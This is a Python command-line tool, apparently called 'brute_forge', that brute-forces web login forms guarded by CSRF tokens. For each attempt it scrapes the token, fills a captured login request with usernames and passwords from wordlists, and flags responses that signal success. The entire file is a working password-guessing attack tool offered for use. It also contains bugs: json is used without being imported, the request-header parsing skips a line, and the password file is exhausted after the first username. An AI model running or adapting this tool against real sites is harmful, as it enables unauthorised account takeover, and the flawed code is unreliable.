import asyncio
import aiohttp
import argparse
import re


async def brute_force(url, login_request, headers, allow_redirects, proxy, username, password, token_regex, status_str, status_str_neg, success_flag):
    print("USERNAME " + "=" * 100)
    print(username)
    print("PASSWORD " + "=" * 100)
    print(password.strip())
    print()

    password = password.strip()

    if success_flag.is_set():
        task = asyncio.current_task()
        task.cancel()
    async with aiohttp.ClientSession() as session:       
        csrf_token = None
        cookies = None
        try:
            # Issue a GET request and retrieve the CSRF-token
            async with session.get(
                url,
                allow_redirects=allow_redirects,
                proxy=proxy
            ) as response:
                body = await response.text()

                print("GET " + "=" * 100)
                print(body)
                print()

                cookies = response.cookies

                # Search the CSRF-token in the response body
                match = re.search(token_regex, body)
                if match:
                    csrf_token = match.group(1)
                else: # Abort if we can"t find the CSRF-token
                    raise asyncio.CancelledError()

                print("CSRF " + "=" * 100)
                print(csrf_token)
                print()

                # Replace placeholders in HTTP headers and body
                for k, v in login_request["headers"].items():
                    if "^CSRF^" in v:
                        login_request["headers"][k] = v.replace("^CSRF^", csrf_token)

                login_request["body"] = login_request["body"].replace("^USER^", username).replace("^PASS^", password).replace("^CSRF^", csrf_token)

                print("method")
                print(login_request["method"])
                print("url")
                print(url)
                print("headers")
                print(headers)
                print("body")
                print(login_request["body"])

                if success_flag.is_set():
                    task = asyncio.current_task()
                    task.cancel()

                # Issue a login request with the CSRF-token
                async with session.request(
                    login_request["method"],
                    url,
                    headers=login_request["headers"],
                    cookies=cookies,
                    data=login_request["body"],
                    allow_redirects=allow_redirects,
                    proxy=proxy
                ) as response:
                    body = await response.text()

                    print("POST " + "=" * 100)
                    print(body)
                    print()

                    success = False
                    if status_str_neg:
                        # If fail is not in the body => correct creds
                        if not status_str in body:
                            success = True
                    else:
                        # If success is in the body => correct creds
                        if status_str in body:
                            success = True

                    if success:
                        print(f"Success! Username: {username}, Password: {password}")
                        # Set the success flag to True to signal other tasks to stop
                        success_flag.set()

        except asyncio.CancelledError:
            print(f"[-] No CSRF-token found. Login request for username: '{username}' and password '{password}' was cancelled.")
        except Exception as e:
            print(f"[-] Error: {e}")


async def main(args):
    # Setup usernames/passwords
    usernames = [args.username]
    if args.username_file:
        usernames = open(args.username_file, "r")
 
    passwords = [args.password]
    if args.password_file:
        passwords = open(args.password_file, "r")
    
    # Parse login request from file
    login_request = {}
    with open(args.request, "r") as f:
        request = f.read()

        headers, body = request.split("\n\n", 1)
        _, headers = headers.split("\n", 1)
        method, url = request.split(" ", 1)

        headers_dict = {}
        for header in headers.split("\n")[1:]:
            key, value = header.split(": ", 1)
            headers_dict[key] = value
        
        login_request["method"] = method
        login_request["headers"] = headers_dict
        login_request["body"] = body

    # Use custom headers
    headers = None
    if args.headers:
        headers = json.loads(args.headers)

    # Create a shared success flag among tasks
    success_flag = asyncio.Event()
    
    tasks = []
    for username in usernames:
        for password in passwords:
            task = asyncio.create_task(
                brute_force(
                    args.url,
                    login_request,
                    headers,
                    args.allow_redirects,
                    args.proxy,
                    username,
                    password,
                    args.token_regex,
                    args.fail or args.success,
                    True if args.fail else False,
                    success_flag
                )
            )
            tasks.append(task)

    # Wait for all tasks to be canceled
    await asyncio.gather(*tasks, return_exceptions=True)

    # Cleanup
    if args.username_file:
        usernames.close()
    if args.password_file:
        passwords.close()


def parse_args():
    parser = argparse.ArgumentParser(prog="brute_forge", description="brute-force http logins protected with CSRF-tokens")
    parser.add_argument("-u", "--url", help="URL of login form", required=True)
    parser.add_argument("-r", "--request", help="File containing the login request (likely a POST request). Placeholders: username=^USER^, password=^PASS^, CSRF-token=^CSRF^", required=True)
    parser.add_argument("-hd", "--headers", help="HTTP headers for login request (JSON string). CSRF-token placeholder: ^CSRF^. Example: {'x-header1': 'yep', 'x-header2': 'nope'}")
    parser.add_argument("-t", "--token-regex", help="Regex for CSRF-token. The CSRF-token is set as the first group of a potential match. Example: 'token=\"(.*?)\"'", required=True)
    parser.add_argument("-ar", "--allow-redirects", help="Allow redirects", action="store_true")
    parser.add_argument("--proxy", help="Proxy URL")

    username_group = parser.add_mutually_exclusive_group()
    username_group.add_argument("-l", "--username", help="Single username for login")
    username_group.add_argument("-L", "--username-file", help="File containing usernames (one per line)")
    
    password_group = parser.add_mutually_exclusive_group()
    password_group.add_argument("-p", "--password", help="Single password for login")
    password_group.add_argument("-P", "--password-file", help="File containing passwords (one per line)")

    status_group = parser.add_mutually_exclusive_group()
    status_group.add_argument("-f", "--fail", help="String that indicates a failed login attempt")
    status_group.add_argument("-s", "--success", help="String that indicates a successful login attempt")

    return parser.parse_args()


if __name__ == "__main__":
    asyncio.run(main(parse_args()))
